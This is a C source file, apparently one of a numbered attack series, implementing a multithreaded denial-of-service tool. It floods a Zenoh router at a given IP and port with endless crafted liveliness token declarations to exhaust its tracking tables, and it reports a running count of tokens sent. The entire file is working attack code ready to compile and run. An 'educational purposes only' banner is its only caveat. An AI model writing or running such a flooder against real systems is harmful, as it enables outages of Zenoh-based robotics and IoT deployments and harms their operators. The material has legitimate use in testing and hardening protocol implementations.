/*
 * Attack 17: Liveliness Token Flooding
 * Floods with liveliness declarations to exhaust tracking
 * 
 * Compile: gcc -o attack17_liveliness attack_17_liveliness_flood.c -pthread
 * Run: ./attack17_liveliness <target_ip> <target_port> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_N_DECLARE 0x0B
#define Z_DECL_TOKEN 0x05  // Liveliness token

static volatile int g_running = 1;
static atomic_ullong g_tokens_declared = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping liveliness flooding...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

size_t craft_liveliness_declaration(unsigned char *buffer, unsigned int token_id,
                                   const char *key_expr) {
    size_t offset = 0;
    
    // Network message: DECLARE
    buffer[offset++] = Z_N_DECLARE;
    
    // Declaration type: TOKEN (liveliness)
    buffer[offset++] = Z_DECL_TOKEN;
    
    // Token ID
    offset += encode_zint(buffer + offset, token_id);
    
    // Key expression
    size_t key_len = strlen(key_expr);
    offset += encode_zint(buffer + offset, key_len);
    memcpy(buffer + offset, key_expr, key_len);
    offset += key_len;
    
    return offset;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[1024];
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
        fprintf(stderr, "[-] Thread %d: Connect failed\n", args->thread_id);
        close(sock);
        free(args);
        return NULL;
    }
    
    printf("[+] Thread %d connected, flooding liveliness tokens\n", args->thread_id);
    
    unsigned int token_id = args->thread_id * 100000;
    unsigned long local_count = 0;
    
    while (g_running) {
        // Create unique liveliness key
        char key_expr[256];
        snprintf(key_expr, sizeof(key_expr),
                "@/liveliness/attack/thread%d/token%u/%lu",
                args->thread_id, token_id, local_count);
        
        size_t msg_len = craft_liveliness_declaration(buffer, token_id++, key_expr);
        
        ssize_t sent = send(sock, buffer, msg_len, 0);
        if (sent < 0) {
            fprintf(stderr, "[-] Thread %d: Send failed\n", args->thread_id);
            break;
        }
        
        atomic_fetch_add(&g_tokens_declared, 1);
        local_count++;
        
        if (local_count % 1000 == 0) {
            printf("[Thread %d] Declared %lu liveliness tokens\n",
                   args->thread_id, local_count);
        }
        
        usleep(100);
    }
    
    close(sock);
    printf("[*] Thread %d stopped\n", args->thread_id);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Liveliness Token Flooding          ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Effect: Exhaust liveliness tracking tables\n\n");
    
    signal(SIGINT, signal_handler);
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
        usleep(50000);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        unsigned long long total = atomic_load(&g_tokens_declared);
        time_t elapsed = time(NULL) - start;
        printf("[*] Tokens declared: %llu | Rate: %.2f tps\n",
               total, elapsed > 0 ? (double)total / elapsed : 0.0);
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Tokens: %-28llu ║\n", 
           (unsigned long long)atomic_load(&g_tokens_declared));
    printf("║ Duration:     %-28ld ║\n", time(NULL) - start);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}